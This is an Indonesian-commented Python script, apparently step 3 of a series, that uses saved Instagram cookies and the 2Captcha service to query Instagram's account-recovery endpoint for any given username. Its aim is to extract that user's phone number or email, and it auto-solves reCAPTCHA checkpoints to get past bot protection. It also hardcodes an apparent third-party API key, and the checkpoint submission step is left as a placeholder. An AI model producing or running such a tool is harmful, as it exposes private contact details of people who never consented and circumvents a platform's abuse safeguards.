"""
STEP 3: AMBIL PHONE + EMAIL DENGAN 2CAPTCHA
=============================================
Jika step 2 berhasil, gunakan ini untuk ambil phone/email dengan 2Captcha solving

Command:
python 3_AMBIL_PHONE_EMAIL.py evasswnd
"""

import requests
import json
import sys
from twocaptcha import TwoCaptcha

# Config 2Captcha
config = {
    'server': '2captcha.com',
    'apiKey': '0ffd29027a459d20ee4085a8b9b8b055',
    'defaultTimeout': 120,
    'pollingInterval': 10,
}

def load_cookies():
    try:
        with open('instagram_cookies.json', 'r') as f:
            return json.load(f)
    except:
        print("❌ File instagram_cookies.json tidak ada!")
        print("Jalankan: python 1_LOGIN_DULU.py username password")
        sys.exit(1)

def get_phone_number(username):
    solver = TwoCaptcha(**config)
    cookies = load_cookies()
    session = requests.Session()
    session.cookies.update(cookies)
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    print(f"[*] Attempting to get phone number for: {username}")
    
    # Step 1: Reset page (CAPTCHA checkpoint di sini)
    print("[*] Step 1: Opening reset page...")
    reset_url = 'https://www.instagram.com/accounts/password/reset/'
    resp = session.get(reset_url, headers=headers)
    
    # Step 2: Attempt recovery
    print("[*] Step 2: Attempting recovery...")
    recovery_url = 'https://www.instagram.com/api/v1/accounts/account_recovery_send_ajax/'
    
    recovery_data = {
        'user_email_or_phone_number': username,
        'recaptcha_token': ''  # Kosong dulu
    }
    
    resp = session.post(recovery_url, data=recovery_data, headers=headers)
    
    if 'checkpoint_required' in resp.text:
        print("⚠️  Checkpoint required!")
        
        # Parse checkpoint
        data = resp.json()
        checkpoint_url = data.get('checkpoint_url', '')
        
        if checkpoint_url:
            print(f"[*] Solving CAPTCHA di: {checkpoint_url}")
            
            # Fetch checkpoint page
            resp_checkpoint = session.get(checkpoint_url, headers=headers)
            
            # Extract sitekey dari response
            import re
            sitekey_match = re.search(r'"sitekey":"([^"]+)"', resp_checkpoint.text)
            
            if sitekey_match:
                sitekey = sitekey_match.group(1)
                print(f"[+] Sitekey found: {sitekey[:10]}...")
                
                # Solve CAPTCHA
                print("[*] Solving reCAPTCHA with 2Captcha...")
                try:
                    result = solver.recaptcha(
                        sitekey=sitekey,
                        url=checkpoint_url,
                        version='v2'
                    )
                    
                    captcha_token = result.get('code')
                    print(f"✅ CAPTCHA Solved: {captcha_token[:20]}...")
                    
                    # Submit checkpoint dengan token
                    print("[*] Submitting checkpoint verification...")
                    # (Logika submit checkpoint di sini)
                    
                except Exception as e:
                    print(f"❌ CAPTCHA Error: {e}")
                    return None
    
    elif resp.status_code == 200:
        data = resp.json()
        print("✅ SUCCESS!")
        print(json.dumps(data, indent=2))
        return data
    else:
        print(f"❌ Error: {resp.status_code}")
        print(resp.text)
        return None

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python 3_AMBIL_PHONE_EMAIL.py username")
        sys.exit(1)
    
    username = sys.argv[1]
    get_phone_number(username)
